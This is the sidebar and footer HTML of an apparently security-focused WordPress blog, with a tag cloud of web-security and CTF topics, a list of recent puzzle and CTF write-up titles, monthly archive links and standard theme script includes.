<a href='https://buer.haus/tag/admin/' class='tag-link-20 tag-link-position-2' title='1 topic' style='font-size: 8pt;'>admin</a>
<a href='https://buer.haus/tag/airbnb/' class='tag-link-50 tag-link-position-3' title='4 topics' style='font-size: 14.363636363636pt;'>airbnb</a>
<a href='https://buer.haus/tag/anime/' class='tag-link-40 tag-link-position-4' title='1 topic' style='font-size: 8pt;'>anime</a>
<a href='https://buer.haus/tag/application-security/' class='tag-link-26 tag-link-position-5' title='1 topic' style='font-size: 8pt;'>application security</a>
<a href='https://buer.haus/tag/appsec/' class='tag-link-25 tag-link-position-6' title='1 topic' style='font-size: 8pt;'>appsec</a>
<a href='https://buer.haus/tag/badge_challenge/' class='tag-link-44 tag-link-position-7' title='2 topics' style='font-size: 10.863636363636pt;'>badge_challenge</a>
<a href='https://buer.haus/tag/bounty/' class='tag-link-5 tag-link-position-8' title='1 topic' style='font-size: 8pt;'>bounty</a>
<a href='https://buer.haus/tag/bounty-programs/' class='tag-link-8 tag-link-position-9' title='3 topics' style='font-size: 12.772727272727pt;'>bounty programs</a>
<a href='https://buer.haus/tag/bug-bounty/' class='tag-link-18 tag-link-position-10' title='3 topics' style='font-size: 12.772727272727pt;'>bug bounty</a>
<a href='https://buer.haus/tag/burp/' class='tag-link-10 tag-link-position-11' title='2 topics' style='font-size: 10.863636363636pt;'>burp</a>
<a href='https://buer.haus/tag/co9/' class='tag-link-48 tag-link-position-12' title='1 topic' style='font-size: 8pt;'>co9</a>
<a href='https://buer.haus/tag/cross-site-request-forgery/' class='tag-link-23 tag-link-position-13' title='1 topic' style='font-size: 8pt;'>cross-site request forgery</a>
<a href='https://buer.haus/tag/cross-site-scripting/' class='tag-link-6 tag-link-position-14' title='2 topics' style='font-size: 10.863636363636pt;'>cross-site scripting</a>
<a href='https://buer.haus/tag/crypto/' class='tag-link-43 tag-link-position-15' title='4 topics' style='font-size: 14.363636363636pt;'>crypto</a>
<a href='https://buer.haus/tag/csaw/' class='tag-link-35 tag-link-position-16' title='1 topic' style='font-size: 8pt;'>CSAW</a>
<a href='https://buer.haus/tag/csrf/' class='tag-link-21 tag-link-position-17' title='1 topic' style='font-size: 8pt;'>csrf</a>
<a href='https://buer.haus/tag/css/' class='tag-link-33 tag-link-position-18' title='1 topic' style='font-size: 8pt;'>css</a>
<a href='https://buer.haus/tag/ctf/' class='tag-link-34 tag-link-position-19' title='14 topics' style='font-size: 22pt;'>CTF</a>
<a href='https://buer.haus/tag/defcon/' class='tag-link-41 tag-link-position-20' title='2 topics' style='font-size: 10.863636363636pt;'>defcon</a>
<a href='https://buer.haus/tag/defcon22/' class='tag-link-42 tag-link-position-21' title='1 topic' style='font-size: 8pt;'>defcon22</a>
<a href='https://buer.haus/tag/defcon23/' class='tag-link-47 tag-link-position-22' title='1 topic' style='font-size: 8pt;'>defcon23</a>
<a href='https://buer.haus/tag/detection/' class='tag-link-11 tag-link-position-23' title='2 topics' style='font-size: 10.863636363636pt;'>detection</a>
<a href='https://buer.haus/tag/facebook/' class='tag-link-2 tag-link-position-24' title='2 topics' style='font-size: 10.863636363636pt;'>facebook</a>
<a href='https://buer.haus/tag/flickr/' class='tag-link-22 tag-link-position-25' title='1 topic' style='font-size: 8pt;'>flickr</a>
<a href='https://buer.haus/tag/google/' class='tag-link-19 tag-link-position-26' title='14 topics' style='font-size: 22pt;'>google</a>
<a href='https://buer.haus/tag/hackerone/' class='tag-link-17 tag-link-position-27' title='6 topics' style='font-size: 16.75pt;'>hackerone</a>
<a href='https://buer.haus/tag/javascript/' class='tag-link-27 tag-link-position-28' title='1 topic' style='font-size: 8pt;'>javascript</a>
<a href='https://buer.haus/tag/lfi/' class='tag-link-38 tag-link-position-29' title='1 topic' style='font-size: 8pt;'>lfi</a>
<a href='https://buer.haus/tag/mobile/' class='tag-link-28 tag-link-position-30' title='1 topic' style='font-size: 8pt;'>mobile</a>
<a href='https://buer.haus/tag/montecrypto/' class='tag-link-67 tag-link-position-31' title='1 topic' style='font-size: 8pt;'>montecrypto</a>
<a href='https://buer.haus/tag/potatosec/' class='tag-link-46 tag-link-position-32' title='1 topic' style='font-size: 8pt;'>potatosec</a>
<a href='https://buer.haus/tag/python/' class='tag-link-39 tag-link-position-33' title='1 topic' style='font-size: 8pt;'>python</a>
<a href='https://buer.haus/tag/regex/' class='tag-link-24 tag-link-position-34' title='1 topic' style='font-size: 8pt;'>regex</a>
<a href='https://buer.haus/tag/research/' class='tag-link-12 tag-link-position-35' title='6 topics' style='font-size: 16.75pt;'>research</a>
<a href='https://buer.haus/tag/security/' class='tag-link-3 tag-link-position-36' title='9 topics' style='font-size: 19.136363636364pt;'>security</a>
<a href='https://buer.haus/tag/security-research/' class='tag-link-9 tag-link-position-37' title='1 topic' style='font-size: 8pt;'>security research</a>
<a href='https://buer.haus/tag/sqli/' class='tag-link-37 tag-link-position-38' title='1 topic' style='font-size: 8pt;'>sqli</a>
<a href='https://buer.haus/tag/sql-injection/' class='tag-link-15 tag-link-position-39' title='2 topics' style='font-size: 10.863636363636pt;'>sql injection</a>
<a href='https://buer.haus/tag/ssrf/' class='tag-link-57 tag-link-position-40' title='2 topics' style='font-size: 10.863636363636pt;'>ssrf</a>
<a href='https://buer.haus/tag/waf/' class='tag-link-49 tag-link-position-41' title='1 topic' style='font-size: 8pt;'>waf</a>
<a href='https://buer.haus/tag/web/' class='tag-link-36 tag-link-position-42' title='3 topics' style='font-size: 12.772727272727pt;'>web</a>
<a href='https://buer.haus/tag/whitehat/' class='tag-link-4 tag-link-position-43' title='2 topics' style='font-size: 10.863636363636pt;'>whitehat</a>
<a href='https://buer.haus/tag/xss/' class='tag-link-7 tag-link-position-44' title='5 topics' style='font-size: 15.636363636364pt;'>xss</a>
<a href='https://buer.haus/tag/yahoo/' class='tag-link-16 tag-link-position-45' title='2 topics' style='font-size: 10.863636363636pt;'>yahoo</a></div>
</aside>		<aside id="recent-posts-2" class="widget widget_recent_entries">		<h1 class="widget-title">Recent Posts</h1>		<ul>
					<li>
				<a href="https://buer.haus/2021/10/12/bts-metaversal-album-treasure-hunt-solution/">BT&#8217;s Metaversal Album Treasure Hunt Solution</a>
						</li>
					<li>
				<a href="https://buer.haus/2021/05/13/cr0wnghoul-1eth-puzzle-youve-got-mail-write-up/">Cr0wnGhoul 1ETH Puzzle: You&#8217;ve Got Mail Write-up</a>
						</li>
					<li>
				<a href="https://buer.haus/2021/05/05/coin_artist-50k-follower-puzzle-write-up/">coin_artist 50k Follower Puzzle &#8211; Write-up</a>
						</li>
					<li>
				<a href="https://buer.haus/2021/05/03/defcon-29-ctf-qualifier-3factooorx-write-up/">DEFCON 29 CTF Qualifier: 3FACTOOORX Write-up</a>
						</li>
					<li>
				<a href="https://buer.haus/2020/09/11/coin-coin-artist-20k-puzzle-write-up/">coin_artist &#8211; 34700 $coin Puzzle Write-Up ($20,000)</a>
						</li>
				</ul>
		</aside>		<aside id="archives-2" class="widget widget_archive"><h1 class="widget-title">Archives</h1>		<ul>
			<li><a href='https://buer.haus/2021/10/'>October 2021</a></li>
	<li><a href='https://buer.haus/2021/05/'>May 2021</a></li>
	<li><a href='https://buer.haus/2020/09/'>September 2020</a></li>
	<li><a href='https://buer.haus/2020/07/'>July 2020</a></li>
	<li><a href='https://buer.haus/2020/06/'>June 2020</a></li>
	<li><a href='https://buer.haus/2020/03/'>March 2020</a></li>
	<li><a href='https://buer.haus/2019/10/'>October 2019</a></li>
	<li><a href='https://buer.haus/2018/10/'>October 2018</a></li>
	<li><a href='https://buer.haus/2018/04/'>April 2018</a></li>
	<li><a href='https://buer.haus/2017/06/'>June 2017</a></li>
	<li><a href='https://buer.haus/2017/03/'>March 2017</a></li>
	<li><a href='https://buer.haus/2016/08/'>August 2016</a></li>
	<li><a href='https://buer.haus/2016/05/'>May 2016</a></li>
	<li><a href='https://buer.haus/2016/04/'>April 2016</a></li>
	<li><a href='https://buer.haus/2015/09/'>September 2015</a></li>
	<li><a href='https://buer.haus/2015/08/'>August 2015</a></li>
	<li><a href='https://buer.haus/2015/02/'>February 2015</a></li>
	<li><a href='https://buer.haus/2015/01/'>January 2015</a></li>
	<li><a href='https://buer.haus/2014/10/'>October 2014</a></li>
	<li><a href='https://buer.haus/2014/08/'>August 2014</a></li>
	<li><a href='https://buer.haus/2014/07/'>July 2014</a></li>
	<li><a href='https://buer.haus/2014/06/'>June 2014</a></li>
	<li><a href='https://buer.haus/2014/04/'>April 2014</a></li>
		</ul>
		</aside>		</div><!-- #secondary -->
	
	</div><!-- #content -->
    <!--
	<footer id="colophon" class="site-footer" role="contentinfo">
		<div class="site-footer-wrapper">
			<div class="site-info">
								<a href="http://wordpress.org/" rel="generator">Proudly powered by WordPress</a>
				<span class="sep"> | </span>
				Theme: Big Brother by <a href="http://automattic.com" rel="designer">WordPress.com</a>.			</div>
					</div>
	</footer>
    -->
</div><!-- #page -->

<script type='text/javascript' src='https://buer.haus/wp-content/plugins/wp-syntax/js/wp-syntax.js?ver=1.1'></script>
<script type='text/javascript' src='https://buer.haus/wp-content/themes/big-brother-wpcom/js/navigation.js?ver=20120206'></script>
<script type='text/javascript' src='https://buer.haus/wp-content/themes/big-brother-wpcom/js/skip-link-focus-fix.js?ver=20130115'></script>
<script type='text/javascript' src='https://buer.haus/wp-includes/js/wp-embed.min.js?ver=4.7.2'></script>

</body>
</html>